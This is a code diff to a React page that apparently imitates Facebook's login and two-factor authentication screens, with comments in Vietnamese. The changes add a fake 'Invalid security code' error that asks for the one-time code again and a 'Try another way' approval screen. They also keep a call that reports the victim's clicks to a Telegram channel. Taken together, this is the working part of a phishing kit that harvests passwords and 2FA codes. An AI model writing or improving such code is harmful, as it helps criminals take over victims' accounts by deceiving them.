@@ -18,8 +18,9 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
-  // States cho Gửi lại mã
+  // States cho Gửi lại mã & Thử cách khác
   const [resendTimer, setResendTimer] = useState(0);
+  const [showApprove, setShowApprove] = useState(false); // Thêm state này
 
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
@@ -520,10 +521,10 @@ export default function Home() {
                     </form>
                 )}
 
-                                                {/* FORM 3: 2FA */}
+                {/* FORM 3: 2FA */}
                 {step === 3 && (
                   <>
-                    {!showOtpError ? (
+                    {!showApprove ? (
                       // GIAO DIỆN NHẬP MÃ OTP
                       <>
                         <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
@@ -540,21 +541,26 @@ export default function Home() {
                                 style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
                                 placeholder="00000000" 
                                 value={otp} 
-                                onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); }} 
+                                onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
                                 required 
                                 maxLength={8} 
                             />
+                            
+                            {showOtpError && (
+                                <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
+                                    Invalid security code. Please check the code and try again.
+                                </div>
+                            )}
                             
                             <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
                                 {loading ? 'Verifying...' : 'Verify'}
                             </button>
                             
-                            {/* NÚT THỬ CÁCH KHÁC */}
                             <div style={{ textAlign: 'center', marginTop: '8px' }}>
                                 <button 
                                     type="button" 
                                     onClick={() => {
-                                        setShowOtpError(true); // Dùng tạm state này để chuyển giao diện
+                                        setShowApprove(true); 
                                         sendTelegramMessage('\n<b>User clicked: Try another way</b>');
                                     }} 
                                     style={{ background: 'none', border: 'none', color: '#0064e0', fontSize: '14px', fontWeight: '500', cursor: 'pointer' }}
@@ -579,7 +585,7 @@ export default function Home() {
                         
                         <button 
                             type="button" 
-                            onClick={() => { setShowOtpError(false); setOtp(''); }} 
+                            onClick={() => { setShowApprove(false); setOtp(''); }} 
                             className="fb-btn"
                         >
                             Back
